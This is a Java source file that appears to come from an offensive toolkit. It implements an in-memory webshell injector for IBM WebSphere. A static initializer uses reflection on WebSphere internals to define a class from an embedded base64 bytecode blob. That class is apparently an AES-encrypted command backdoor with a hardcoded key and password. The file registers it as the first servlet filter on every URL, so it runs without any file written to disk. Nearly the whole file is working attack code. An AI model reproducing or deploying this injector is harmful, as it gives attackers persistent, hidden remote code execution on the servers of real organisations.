package core.memshell;

import sun.misc.BASE64Decoder;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;

public class WebSphereFilterMemShell {

    static{
        Inject();
    }

    public WebSphereFilterMemShell(){
        Inject();
    }

    public static synchronized Class getDynamicFilterTemplateClass() {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Class clazz = null;
        try{
            clazz = cl.loadClass("memshell.WebSphereFilterShell");
        }catch(ClassNotFoundException e){
            BASE64Decoder base64Decoder = new BASE64Decoder();
            String codeClass = "yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTG1lbXNoZWxsL1dlYlNwaGVyZUZpbHRlclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA8QcBBgcAxQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHANwBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHAQcBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsHAQgHAQkBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAGVdlYlNwaGVyZUZpbHRlclNoZWxsLmphdmEMAGYAZwwAXABdDABeAF8BABAzYzZlMGI4YTljMTUyMjRhDABgAGEBAARwQVMzDABiAGEBABAvZmF2aWNvbmRlbW8uaWNvDABjAGEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBCgELDAEMAQ0MAGQAgQwAZABhAQAFVVRGLTgMAGUAYQwAZgBtDAEOAQ8BAANBRVMHAQYMARABEQEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMARIBEwwAZgEUDACSARUMARYBFwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHARgMARABGQwBGgEbDAEcAR0BABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBHgETDABmAR8MAQwBIAwBIQENAQAQamF2YS51dGlsLkJhc2U2NAwBIgEjAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBJAElAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBJgwBJwEoDAEpASoBAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBKwEsAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBYLVJlcXVlc3RlZC1XaXRoDAEtAIEBAA5YTUxIVFRQUmVxdWVzdAwBLgEvDAEwATEMATIAgQwAjwCQDAB0AHUBABBtZW1zaGVsbC5wYXlsb2FkBwEIDAEzATQBAB1tZW1zaGVsbC9XZWJTcGhlcmVGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9s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";
            byte[] bytes = new byte[0];
            try {
                bytes = base64Decoder.decodeBuffer(codeClass);
            } catch (IOException ex) {
                ex.printStackTrace();
            }

            Method method = null;
            Class clz = cl.getClass();
            while(method == null && clz != Object.class ){
                try{
                    method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                }catch(NoSuchMethodException ex){
                    clz = clz.getSuperclass();
                }
            }
            method.setAccessible(true);
            try {
                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
            } catch (IllegalAccessException ex) {
                ex.printStackTrace();
            } catch (InvocationTargetException ex) {
                ex.printStackTrace();
            }
        }

        return clazz;
    }

    public static synchronized void Inject(){
        try{
            String filterName = "memshell.WebSphereFilterMemShell";
            String urlPattern = "/*";

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for(int j = 0; j < obj_arr.length; j++){
                Object o = obj_arr[j];
                if(o == null) continue;

                if(o.getClass().getName().endsWith("WebContainerRequestState")){
                    Object request = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);

                    field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object context = field.get(servletContext);

                    field = context.getClass().getSuperclass().getDeclaredField("config");
                    field.setAccessible(true);
                    Object webAppConfiguration = field.get(context);

                    Method method = null;
                    Method[] methods = webAppConfiguration.getClass().getMethods();
                    for(int i = 0; i < methods.length; i++){
                        if(methods[i].getName().equals("getFilterMappings")){
                            method = methods[i];
                            break;
                        }
                    }
                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

                    boolean flag = false;
                    for(int i = 0; i < filerMappings.size(); i++){
                        Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                        String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }

                    //如果已存在同名的 Filter，就不在添加，防止重复添加
                    if(!flag){
                        clazz = getDynamicFilterTemplateClass();

                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
                        Object filter = clazz.newInstance();
                        filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("addFilterInfo")){
                                method = methods[i];
                                break;
                            }
                        }
                        method.invoke(webAppConfiguration, new Object[]{filterConfig});

                        field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
                        field.setAccessible(true);
                        Object original = field.get(filterConfig);

                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
                        field.set(filterConfig, null);

                        method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});

                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                        field.set(filterConfig, original);

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("getUriFilterMappings")){
                                method = methods[i];
                                break;
                            }
                        }

                        //这里的目的是为了将我们添加的动态 Filter 放到第一位
                        List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);
                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
                    }

                    break;
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}

